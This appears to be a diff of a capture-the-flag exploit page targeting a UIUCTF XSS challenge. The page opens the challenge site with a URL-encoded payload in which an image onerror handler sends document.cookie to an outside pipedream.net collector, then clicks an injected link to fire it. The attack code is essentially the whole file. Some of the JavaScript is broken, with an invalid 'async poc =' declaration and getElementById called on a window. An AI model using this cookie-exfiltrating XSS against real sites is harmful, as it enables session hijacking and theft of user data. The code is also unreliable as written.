@@ -1,19 +1,19 @@
 <html>
-  <head></head>
-  <body>
+  <head>
+  </head>
+  <body onload=poc()>
     <script>
 
-    const sleep = (time) => {
-      return new Promise(resolve => setTimeout(resolve, time));
-    }
-      
-    const ifr = document.createElement("iframe");
-    ifr.src = 'https://peanut-xss-web.chal.uiuc.tf/?nutshell=%3Chtml%3E%0A%3Cbody%3E%0A%20%20%20%20%3Ch2%3ETo%20write%20a%20section%2C%3C%2Fh2%3E%0A%20%20%20%20%26%23x3C%3Bimg%20src%20onerror%3D%22window.location%20%3D%20%60https%3A%2F%2Fenktggufkorob.x.pipedream.net%2F%3Fflag%3D%24%7Bdocument.cookie%7D%60%22%26%23x3E%3B%0A%20%20%20%20%3Ch2%3ETo%20embed%20a%20section%2C%3C%2Fh2%3E%0A%20%20%20%20%3Cp%3Ejust%20make%20a%20link%20with%20%3Acolon%20at%20the%20front%E2%80%A6%20%3Ca%20href%3D%22%23ToWriteASection%22%3E%3ALIKE%20THIS%3C%2Fa%3E!%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%20%20%20%20'
-  
-    document.body.appendChild(ifr)
-    
-  
-    ifr.location.hash = '#ToWriteASection'
+      const sleep = (time) => {
+        return new Promise(resolve => setTimeout(resolve, time));
+      }
+      async poc = () => {
+        const win = window.open('https://peanut-xss-web.chal.uiuc.tf/?nutshell=%3Chtml%3E%0A%3Cbody%3E%0A%20%20%20%20%3Ch2%3ETo%20write%20a%20section%2C%3C%2Fh2%3E%0A%20%20%20%20%26%23x3C%3Bimg%20src%20onerror%3D%26%23x22%3Bwindow.location%3D%26%23x60%3Bhttps%3A%2F%2Fenktggufkorob.x.pipedream.net%2F%3Fflag%3D%24%7Bdocument.cookie%7D%26%23x60%3B%26%23x22%3B%26%23x3E%3B%0A%20%20%20%20%3Ch2%3ETo%20embed%20a%20section%2C%3C%2Fh2%3E%0A%20%20%20%20%3Cp%3Ejust%20make%20a%20link%20with%20%3Acolon%20at%20the%20front%E2%80%A6%20%3Ca%20href%3D%22%23ToWriteASection%22%20id%3D%22exploit%22%3E%3ALIKE%20THIS%3C%2Fa%3E!%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%20%20%20%20#ToWriteASection')
+        
+        await sleep(1500);
+
+        win.getElementById('exploit').click()
+      }
     </script>
   </body>
 </html>
